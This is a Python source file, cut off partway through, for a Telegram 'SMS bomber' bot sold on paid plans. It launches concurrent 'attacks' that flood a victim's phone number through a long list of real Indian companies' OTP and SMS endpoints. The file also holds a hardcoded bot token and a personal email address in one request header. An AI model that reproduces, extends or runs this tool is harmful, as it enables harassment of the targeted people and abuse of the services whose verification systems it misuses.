import sys
import types
import ssl
import re
import os
import json
import logging
import asyncio
import aiohttp
import time
import random
import string
import signal
from datetime import datetime, timedelta

# ========== SQLITE IMPORTS ==========
import aiosqlite
import sqlite3

# ========== LOGGING ==========
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ========== CGI FIX ==========
class CGI:
    def parse_multipart(self, *args, **kwargs):
        return {}
    class FieldStorage:
        def __init__(self, *args, **kwargs):
            self.value = None
            self.filename = None
            self.file = None
            self.type = None
            self.headers = {}
        def __getattr__(self, name):
            return None

cgi_module = types.ModuleType('cgi')
cgi_module.parse_multipart = CGI().parse_multipart
cgi_module.FieldStorage = CGI.FieldStorage
cgi_module.__dict__.update({
    'parse_multipart': CGI().parse_multipart,
    'FieldStorage': CGI.FieldStorage
})
sys.modules['cgi'] = cgi_module

# ========== HTTPX FIX ==========
import httpx
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)

_original_async_client_init = httpx.AsyncClient.__init__
def _patched_async_client_init(self, *args, **kwargs):
    deprecated = ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']
    for param in deprecated:
        if param in kwargs:
            if param in ('proxy', 'proxies'):
                if 'proxies' not in kwargs and 'proxy' in kwargs:
                    kwargs['proxies'] = kwargs.pop('proxy')
                elif 'proxy' in kwargs:
                    kwargs.pop('proxy')
                if 'proxies' in kwargs and kwargs['proxies'] is None:
                    kwargs.pop('proxies')
            else:
                kwargs.pop(param, None)
    try:
        _original_async_client_init(self, *args, **kwargs)
    except TypeError:
        clean = {}
        for p in ['timeout', 'proxies', 'limits', 'max_redirects', 'follow_redirects']:
            if p in kwargs:
                clean[p] = kwargs[p]
        _original_async_client_init(self, *args, **clean)
httpx.AsyncClient.__init__ = _patched_async_client_init

_original_client_init = httpx.Client.__init__
def _patched_client_init(self, *args, **kwargs):
    deprecated = ['proxy', 'proxies', 'http1', 'http2', 'verify', 'cert', 'trust_env']
    for param in deprecated:
        if param in kwargs:
            if param in ('proxy', 'proxies'):
                if 'proxies' not in kwargs and 'proxy' in kwargs:
                    kwargs['proxies'] = kwargs.pop('proxy')
                elif 'proxy' in kwargs:
                    kwargs.pop('proxy')
                if 'proxies' in kwargs and kwargs['proxies'] is None:
                    kwargs.pop('proxies')
            else:
                kwargs.pop(param, None)
    try:
        _original_client_init(self, *args, **kwargs)
    except TypeError:
        clean = {}
        for p in ['timeout', 'proxies', 'limits', 'max_redirects', 'follow_redirects']:
            if p in kwargs:
                clean[p] = kwargs[p]
        _original_client_init(self, *args, **clean)
httpx.Client.__init__ = _patched_client_init

from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler

# ========== ENV ==========
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8495053693:AAFGI4W46SWbwpTGQApsIBhdvi0dTVHtOe4")
OWNER_ID = int(os.environ.get("OWNER_ID", 8128821116))
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8128821116))
WELCOME_IMAGE = os.environ.get("WELCOME_IMAGE", "https://kommodo.ai/i/wqVc4u68cErtebyE6okA")
PORT = int(os.environ.get("PORT", 8080))
WEBHOOK_URL = os.environ.get("WEBHOOK_URL", "")
USE_WEBHOOK = os.environ.get("USE_WEBHOOK", "false").lower() == "true"
DB_PATH = os.environ.get("DB_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "rolexbomber.db"))

PLANS = {
    "standard": {"name": "Standard", "price": 149, "days": 30, "concurrent": 2, "max_duration": 300},
    "premium": {"name": "Premium", "price": 249, "days": 30, "concurrent": 5, "max_duration": 720},
    "ultimate": {"name": "Ultimate", "price": 349, "days": 30, "concurrent": 10, "max_duration": 720}
}

# ========== SQLITE STORAGE ==========
class SqliteStorage:
    def __init__(self, db_path):
        self.db_path = db_path
        self._conn = None
        self.temp_attack_data = {}
        d = os.path.dirname(os.path.abspath(db_path))
        if d and not os.path.exists(d):
            os.makedirs(d, exist_ok=True)

    async def _connect(self):
        if self._conn is None:
            self._conn = await aiosqlite.connect(self.db_path)
            self._conn.row_factory = sqlite3.Row
        return self._conn

    async def _exec(self, sql, params=()):
        conn = await self._connect()
        cur = await conn.execute(sql, params)
        await conn.commit()
        return cur

    async def _fetchone(self, sql, params=()):
        conn = await self._connect()
        cur = await conn.execute(sql, params)
        row = await cur.fetchone()
        await cur.close()
        return row

    async def _fetchall(self, sql, params=()):
        conn = await self._connect()
        cur = await conn.execute(sql, params)
        rows = await cur.fetchall()
        await cur.close()
        return rows

    async def ensure_indexes(self):
        conn = await self._connect()
        await conn.execute("CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY, premium_expiry TEXT, premium_plan TEXT DEFAULT 'standard', protected_number TEXT, created_at TEXT)")
        await conn.execute("CREATE TABLE IF NOT EXISTS redeem_codes (code TEXT PRIMARY KEY, days INTEGER, plan_type TEXT, is_used INTEGER DEFAULT 0, created_at TEXT)")
        await conn.execute("CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT)")
        await conn.execute("CREATE TABLE IF NOT EXISTS contact_messages (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, message TEXT, status TEXT DEFAULT 'pending', created_at TEXT, replied_at TEXT, reply_text TEXT)")
        await conn.execute("CREATE TABLE IF NOT EXISTS contact_blocked (user_id INTEGER PRIMARY KEY, blocked_at TEXT)")
        await conn.commit()

    async def get_user(self, user_id):
        row = await self._fetchone("SELECT * FROM users WHERE user_id = ?", (int(user_id),))
        return dict(row) if row else None

    async def add_user(self, user_id):
        if not await self.get_user(user_id):
            try:
                await self._exec("INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at) VALUES (?,?,?,?,?)",
                                 (int(user_id), None, "standard", None, datetime.now().isoformat()))
            except Exception:
                pass
        return True

    async def is_premium(self, user_id):
        if user_id == OWNER_ID:
            return True
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                return datetime.now() < datetime.fromisoformat(user["premium_expiry"])
            except Exception:
                return False
        return False

    async def get_concurrent_limit(self, user_id):
        if user_id == OWNER_ID:
            return 10
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                if datetime.now() < datetime.fromisoformat(user["premium_expiry"]):
                    return PLANS.get(user.get("premium_plan", "standard"), PLANS["standard"])["concurrent"]
            except Exception:
                pass
        return 0

    async def get_max_duration(self, user_id):
        if user_id == OWNER_ID:
            return 720
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                if datetime.now() < datetime.fromisoformat(user["premium_expiry"]):
                    return PLANS.get(user.get("premium_plan", "standard"), PLANS["standard"])["max_duration"]
            except Exception:
                pass
        return 0

    async def get_plan_name(self, user_id):
        if user_id == OWNER_ID:
            return "Ultimate"
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                if datetime.now() < datetime.fromisoformat(user["premium_expiry"]):
                    return PLANS.get(user.get("premium_plan", "standard"), PLANS["standard"])["name"]
            except Exception:
                pass
        return "Free"

    async def get_expiry(self, user_id):
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                exp = datetime.fromisoformat(user["premium_expiry"])
                if datetime.now() < exp:
                    return user["premium_expiry"]
            except Exception:
                pass
        return "Not Active"

    async def add_premium(self, user_id, days, plan_type="standard"):
        current = datetime.now()
        user = await self.get_user(user_id)
        if user and user.get("premium_expiry"):
            try:
                stored = datetime.fromisoformat(user["premium_expiry"])
                if stored > current:
                    current = stored
            except Exception:
                pass
        new_exp = current + timedelta(days=days)
        str_exp = new_exp.isoformat()
        await self._exec(
            "INSERT INTO users (user_id, premium_expiry, premium_plan, protected_number, created_at) VALUES (?, ?, ?, NULL, ?)"
            " ON CONFLICT(user_id) DO UPDATE SET premium_expiry=excluded.premium_expiry, premium_plan=excluded.premium_plan",
            (int(user_id), str_exp, plan_type, datetime.now().isoformat())
        )
        return str_exp

    async def remove_premium(self, user_id):
        await self._exec("UPDATE users SET premium_expiry = NULL, premium_plan = NULL WHERE user_id = ?", (int(user_id),))
        return True

    async def get_all_users_with_plan(self):
        rows = await self._fetchall("SELECT user_id, premium_expiry, premium_plan, protected_number, created_at FROM users ORDER BY created_at DESC")
        return [dict(r) for r in rows]

    async def generate_code(self, days, plan_type="standard"):
        code = "PREMIUM-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(8))
        existing = await self._fetchone("SELECT code FROM redeem_codes WHERE code = ?", (code,))
        if existing:
            return await self.generate_code(days, plan_type)
        await self._exec("INSERT INTO redeem_codes (code, days, plan_type, is_used, created_at) VALUES (?,?,?,?,?)",
                         (code, days, plan_type, 0, datetime.now().isoformat()))
        return code

    async def redeem(self, user_id, code):
        row = await self._fetchone("SELECT * FROM redeem_codes WHERE code = ?", (code,))
        if not row or row["is_used"] == 1:
            return False, 0, None, None
        days = row["days"] or 0
        plan_type = row["plan_type"] or "standard"
        await self._exec("UPDATE redeem_codes SET is_used = 1 WHERE code = ?", (code,))
        exp_date = await self.add_premium(user_id, days, plan_type)
        return True, days, plan_type, exp_date

    async def protect(self, user_id, number):
        await self._exec("UPDATE users SET protected_number = ? WHERE user_id = ?", (number, int(user_id)))

    async def unprotect(self, user_id):
        await self._exec("UPDATE users SET protected_number = NULL WHERE user_id = ?", (int(user_id),))

    async def is_protected(self, number):
        return (await self._fetchone("SELECT user_id FROM users WHERE protected_number = ?", (number,))) is not None

    async def set_channel(self, channel_id):
        await self._exec("INSERT INTO settings (key, value) VALUES ('channel_id', ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value", (str(channel_id),))

    async def get_channel(self):
        row = await self._fetchone("SELECT value FROM settings WHERE key = 'channel_id'")
        return str(row["value"]) if row and row["value"] else None

    async def remove_channel(self):
        await self._exec("DELETE FROM settings WHERE key = 'channel_id'")

    async def get_all_users(self):
        rows = await self._fetchall("SELECT user_id FROM users")
        return [r["user_id"] for r in rows]

    async def get_stats(self):
        total = (await self._fetchone("SELECT COUNT(*) AS c FROM users"))["c"]
        now = datetime.now().isoformat()
        premium = (await self._fetchone("SELECT COUNT(*) AS c FROM users WHERE premium_expiry > ?", (now,)))["c"]
        codes = (await self._fetchone("SELECT COUNT(*) AS c FROM redeem_codes"))["c"]
        pending = (await self._fetchone("SELECT COUNT(*) AS c FROM contact_messages WHERE status = 'pending'"))["c"]
        return total, premium, codes, pending

    async def add_contact_message(self, user_id, message):
        await self._exec("INSERT INTO contact_messages (user_id, message, status, created_at) VALUES (?,?,?,?)",
                         (int(user_id), message, "pending", datetime.now().isoformat()))
        row = await self._fetchone("SELECT last_insert_rowid() AS id")
        return row["id"] if row else None

    async def get_pending_contacts(self):
        rows = await self._fetchall("SELECT * FROM contact_messages WHERE status = 'pending' ORDER BY created_at ASC")
        return [dict(r) for r in rows]

    async def reply_contact_message(self, msg_id, reply_text):
        await self._exec("UPDATE contact_messages SET status = 'replied', reply_text = ?, replied_at = ? WHERE id = ?",
                         (reply_text, datetime.now().isoformat(), msg_id))

    async def block_contact(self, user_id):
        await self._exec("INSERT OR REPLACE INTO contact_blocked (user_id, blocked_at) VALUES (?,?)",
                         (int(user_id), datetime.now().isoformat()))

    async def unblock_contact(self, user_id):
        await self._exec("DELETE FROM contact_blocked WHERE user_id = ?", (int(user_id),))

    async def is_contact_blocked(self, user_id):
        return (await self._fetchone("SELECT user_id FROM contact_blocked WHERE user_id = ?", (int(user_id),))) is not None

    async def get_blocked_users(self):
        rows = await self._fetchall("SELECT user_id FROM contact_blocked")
        return [r["user_id"] for r in rows]

    def set_attack_data(self, user_id, targets):
        self.temp_attack_data[user_id] = {'targets': targets, 'timestamp': time.time()}

    def get_attack_data(self, user_id):
        data = self.temp_attack_data.get(user_id)
        if data and time.time() - data['timestamp'] < 300:
            return data['targets']
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]
        return None

    def clear_attack_data(self, user_id):
        if user_id in self.temp_attack_data:
            del self.temp_attack_data[user_id]

    async def close(self):
        if self._conn is not None:
            await self._conn.close()
            self._conn = None

db = None

# ============================================================
# COMPLETE API LIST - 350+ APIs
# ============================================================
def build_api_list():
    apis = []

    # ========== SMS APIs ==========
    sms = [
        {"name":"Lenskart_SMS","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","method":"POST","headers":{"Content-Type":"application/json","X-API-Client":"mobilesite","X-Country-Code":"IN"},"body":{"captcha":None,"phoneCode":"+91","telephone":"{no}"}},
        {"name":"Lenskart_SMS_v2","url":"https://api-gateway.juno.lenskart.com/v3/customers/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneCode":"+91","telephone":"{no}"}},
        {"name":"NoBroker_SMS","url":"https://www.nobroker.in/api/v3/account/otp/send","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.nobroker.in"},"body":"phone={no}&countryCode=IN"},
        {"name":"PharmEasy_SMS","url":"https://pharmeasy.in/api/v2/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"PharmEasy_SMS_v2","url":"https://pharmeasy.in/api/auth/requestOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"contactNumber":"{no}"}},
        {"name":"ShipRocket_SMS","url":"https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json","authorization":"Bearer null"},"body":{"mobileNumber":"{no}"}},
        {"name":"GoKwik_SMS","url":"https://gkx.gokwik.co/v3/gkstrict/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json","gk-merchant-id":"19g6jlc658iad"},"body":{"phone":"{no}","country":"in"}},
        {"name":"Wakefit_SMS","url":"https://api.wakefit.co/api/consumer-sms-otp/","method":"POST","headers":{"Content-Type":"application/json","API-Secret-Key":"ycq55IbIjkLb"},"body":{"mobile":"{no}","whatsapp_opt_in":1}},
        {"name":"Hungama_OTP","url":"https://communication.api.hungama.com/v1/communication/otp","method":"POST","headers":{"Content-Type":"application/json","identifier":"home"},"body":{"mobileNo":"{no}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}},
        {"name":"Khatabook","url":"https://api.khatabook.com/v1/auth/request-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","app_signature":"wk+avHrHZf2"}},
        {"name":"Doubtnut_SMS","url":"https://api.doubtnut.com/v4/student/login","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"phone_number":"{no}","language":"en"}},
        {"name":"Doubtnut_Login","url":"https://api.doubtnut.com/v4/student/login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"app_version":"7.10.51","phone_number":"{no}","language":"en"}},
        {"name":"BeepKart_SMS","url":"https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","city":362}},
        {"name":"Snitch_SMS","url":"https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2","method":"POST","headers":{"Content-Type":"application/json","client-id":"snitch_secret"},"body":{"mobile_number":"+91{no}"}},
        {"name":"Snitch_SMS_v2","url":"https://www.snitch.com/api/auth/send-otp","method":"POST","headers":{"Content-Type":"application/json","X-CAP-Token":"81986cb3c6d6b7fd:021b93a18b7d0edf5b5f80b296ca0f"},"body":{"mobile_number":"+{no}"}},
        {"name":"RummyCircle_SMS","url":"https://www.rummycircle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","isPlaycircle":False}},
        {"name":"RummyCircle_Account","url":"https://www.rummycircle.com/api/fl/account/v1/sendOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"otpOnCall":True,"mobile":"{no}","otpType":8.0}},
        {"name":"PokerBaazi","url":"https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","mfa_channels":"phno"}},
        {"name":"My11Circle","url":"https://www.my11circle.com/api/fl/auth/v3/getOtp","method":"POST","headers":{"Content-Type":"application/json;charset=UTF-8"},"body":{"mobile":"{no}"}},
        {"name":"Cosmofeed","url":"https://prod.api.cosmofeed.com/api/user/authenticate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","version":"1.4.28"}},
        {"name":"Dream11_SMS","url":"https://www.dream11.com/auth/passwordless/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"channel":"sms","flow":"SIGNUP","phoneNumber":"{no}","templateName":"default"}},
        {"name":"Dream11_Link","url":"https://api.dream11.com/sendsmslink","method":"POST","headers":{"Content-Type":"application/json"},"body":{"siteId":"1","mobileNum":"{no}","appType":"androidfull"}},
        {"name":"Unacademy_SMS","url":"https://unacademy.com/api/v3/user/user_check/","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"country_code":"IN","phone":"{no}","otp_type":2.0,"send_otp":True}},
        {"name":"Unacademy_Link","url":"https://unacademy.com/api/v1/user/get_app_link/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Vedantu","url":"https://user.vedantu.com/user/preLoginVerification","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","phoneCode":"+91"}},
        {"name":"Byjus_SMS","url":"https://bcas-prod.byjusweb.com/api/send-otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"phoneNumber={no}"},
        {"name":"Byjus_SMS_v2","url":"https://api.byjus.com/v2/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Spinny_OTP","url":"https://api.spinny.com/api/c/user/otp-request/v3/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"contact_number":"{no}","whatsapp":False,"code_len":4}},
        {"name":"Citymall_OTP","url":"https://citymall.live/api/cl-user/auth/get-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}"}},
        {"name":"CityMall_API","url":"https://citymall.live/api/gateway/cl-user/auth/get-otp","method":"POST","headers":{"Content-Type":"application/json","x-requested-with":"WEB","x-app-name":"WEB"},"body":{"phone_number":"{no}"}},
        {"name":"Jobhai","url":"https://api.jobhai.com/auth/jobseeker/v3/send_otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Kwikfix","url":"https://admin.kwikfixauto.in/api/auth/signupotp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Brevistay","url":"https://www.brevistay.com/cst/app-api/login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Hourlyrooms","url":"https://web-api.hourlyrooms.co.in/api/signup/sendphoneotp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"BharatLoan","url":"https://www.bharatloan.com/login-sbm","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobile={no}"},
        {"name":"Pagarbook","url":"https://api.pagarbook.com/api/v5/auth/otp/request","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","language":1}},
        {"name":"Redcliffe","url":"https://api.redcliffelabs.com/api/v1/notification/send_otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone_number":"{no}"}},
        {"name":"55Club","url":"https://api.55clubapi.com/api/webapi/SmsVerifyCode","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"91{no}","codeType":1}},
        {"name":"Woodenstreet","url":"https://api.woodenstreet.com/api/v1/register","method":"POST","headers":{"Content-Type":"application/json"},"body":{"telephone":"{no}"}},
        {"name":"Meru_Cab","url":"https://merucabapp.com/api/otp/generate","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","DeviceType":"Android"},"body":"mobile_number={no}"},
        {"name":"PenPencil","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=1","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{no}"}},
        {"name":"PenPencil_v2","url":"https://api.penpencil.co/v1/users/resend-otp?smsType=2","method":"POST","headers":{"Content-Type":"application/json; charset=utf-8"},"body":{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{no}"}},
        {"name":"Dayco_India","url":"https://ekyc.daycoindia.com/api/nscript_functions.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"body":"api=send_otp&brand=dayco&mob={no}&resend_otp=resend_otp"},
        {"name":"Lending_Plate","url":"https://lendingplate.com/api.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"body":"mobiles={no}&resend=Resend&clickcount=3"},
        {"name":"NewMe_SMS","url":"https://prodapi.newme.asia/web/otp/request","method":"POST","headers":{"Content-Type":"application/json","Caller":"web_app"},"body":{"mobile_number":"{no}","resend_otp_request":True}},
        {"name":"Smytten_SMS","url":"https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode","method":"POST","headers":{"Content-Type":"application/json","UUID":"8e6b1c3f-3d72-42af-89af-201b79dfdf2f"},"body":{"phone":"{no}","email":"sdhabai09@gmail.com"}},
        {"name":"Smytten_v2","url":"https://route.smytten.com/discover_user/users/loginViaNumber","method":"POST","headers":{"Content-Type":"application/json","request_type":"web"},"body":{"value":"{no}","device_platform":"web","guest_user_access":True}},
        {"name":"CaratLane","url":"https://www.caratlane.com/cg/dhevudu","method":"POST","headers":{"Content-Type":"application/json","Authorization":"b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"},"body":{"query":"mutation { SendOtp( input: { mobile: \"{no}\", isdCode: \"91\", otpType: \"registerOtp\" } ) { status { message code } } }"}},
        {"name":"WellAcademy","url":"https://wellacademy.in/store/api/numberLoginV2","method":"POST","headers":{"Content-Type":"application/json; charset=UTF-8"},"body":{"contact_no":"{no}"}},
        {"name":"ServeTel","url":"https://api.servetel.in/v1/auth/otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"mobile_number={no}"},
        {"name":"GoPink_Cabs","url":"https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":"check_mobile_number=1&contact={no}"},
        {"name":"Shemaroome","url":"https://www.shemaroome.com/users/resend_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8","X-Requested-With":"XMLHttpRequest"},"body":"mobile_no=%2B91{no}"},
        {"name":"Cossouq","url":"https://www.cossouq.com/mobilelogin/otp/send","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded","X-Requested-With":"XMLHttpRequest"},"body":"mobilenumber={no}&otptype=register"},
        {"name":"MyImagineStore","url":"https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded; charset=UTF-8"},"body":"mobile={no}"},
        {"name":"Otpless","url":"https://user-auth.otpless.app/v2/lp/user/transaction/intent/e51c5ec2-6582-4ad8-aef5-dde7ea54f6a3","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","selectedCountryCode":"+91"}},
        {"name":"MyHubble","url":"https://api.myhubble.money/v1/auth/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phoneNumber":"{no}","channel":"SMS"}},
        {"name":"TataCapital_Business","url":"https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobileNumber":"{no}","deviceOs":"Android"}},
        {"name":"DealShare","url":"https://services.dealshare.in/userservice/api/v1/user-login/send-login-code","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","hashCode":"k387IsBaTmn"}},
        {"name":"Snapmint","url":"https://api.snapmint.com/v1/public/sign_up","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"Housing_SMS","url":"https://login.housing.com/api/v2/send-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","country_url_name":"in"}},
        {"name":"Housing_GQL_SMS","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&platform=mobile&source=mobile","method":"POST","headers":{"phoenix-api-name":"LOGIN_SEND_OTP_API","app-name":"mobile_web_buyer","Content-Type":"application/json; charset=UTF-8"},"body":{"query":"mutation($phone: String, $userAgent: String, $otpLength: Int) { sendOtp(phone: $phone, userAgent: $userAgent, otpLength: $otpLength) { success message } }","variables":{"phone":"{no}","userAgent":"Mozilla/5.0","otpLength":4}}},
        {"name":"Housing3_SMS","url":"https://mightyzeus-mum.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API","method":"POST","headers":{"Content-Type":"application/json","phoenix-api-name":"LOGIN_SEND_OTP_API"},"body":{"query":"mutation($email:String,$phone:String,$otpLength:Int){sendOtp(phone:$phone,email:$email,otpLength:$otpLength){success message}}","variables":{"phone":"{no}","otpLength":4}}},
        {"name":"RentoMojo","url":"https://www.rentomojo.com/api/RMUsers/isNumberRegistered","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"RentoMojo_Signup","url":"https://www.rentomojo.com/api/RMUsers/signup","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","password":"Test@123","name":"Test"}},
        {"name":"Netmeds","url":"https://apiv2.netmeds.com/mst/rest/v1/id/details/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Netmeds_v2","url":"https://www.netmeds.com/api/v1/auth/login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Nykaa","url":"https://www.nykaa.com/app-api/index.php/customer/send_otp","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"source=sms&mobile_number={no}"},
        {"name":"Animall","url":"https://animall.in/zap/auth/login","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","signupPlatform":"NATIVE_ANDROID"}},
        {"name":"Entri","url":"https://entri.app/api/v3/users/check-phone/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}"}},
        {"name":"EntriApp","url":"https://entri.app/api/v3/users/check-phone/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"+91{no}","recaptcha_response":"dummy"}},
        {"name":"Aakash","url":"https://antheapi.aakash.ac.in/api/generate-lead-otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile_number":"{no}","activity_type":"aakash-myadmission"}},
        {"name":"Revv","url":"https://st-core-admin.revv.co.in/stCore/api/customer/v1/init","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","deviceType":"website"}},
        {"name":"DeHaat","url":"https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","client_id":"kisan-app"}},
        {"name":"A23_Games","url":"https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","device_id":"android123"}},
        {"name":"Spencers","url":"https://jiffy.spencers.in/user/auth/otp/send","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"PayMe_India","url":"https://api.paymeindia.in/api/v2/authentication/phone_no_verify/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"phone":"{no}","app_signature":"S10ePIIrbH3"}},
        {"name":"ShoppersStop","url":"https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","type":"SIGNIN_WITH_MOBILE"}},
        {"name":"Hyuga_Auth","url":"https://hyuga-auth-service.pratech.live/v1/auth/otp/generate","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Lifestyle_Stores","url":"https://www.lifestylestores.com/in/en/mobilelogin/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"signInMobile":"{no}","channel":"sms"}},
        {"name":"MamaEarth","url":"https://auth.mamaearth.in/v1/auth/initiate-signup","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"HomeTriangle","url":"https://hometriangle.com/api/partner/xauth/signup/otp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Wellness_Forever","url":"https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer","method":"POST","headers":{"Content-Type":"application/x-www-form-urlencoded"},"body":"method=firstRegisterApi&data={\"customerMobile\":\"{no}\",\"generateOtp\":\"true\"}"},
        {"name":"HealthMug","url":"https://api.healthmug.com/account/createotp","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Kredily","url":"https://app.kredily.com/ws/v1/accounts/send-otp/","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}"}},
        {"name":"Tata_Motors","url":"https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","sendOtp":"true"}},
        {"name":"Moglix","url":"https://apinew.moglix.com/nodeApi/v1/login/sendOTP","method":"POST","headers":{"Content-Type":"application/json"},"body":{"mobile":"{no}","buildVersion":"24.0"}},
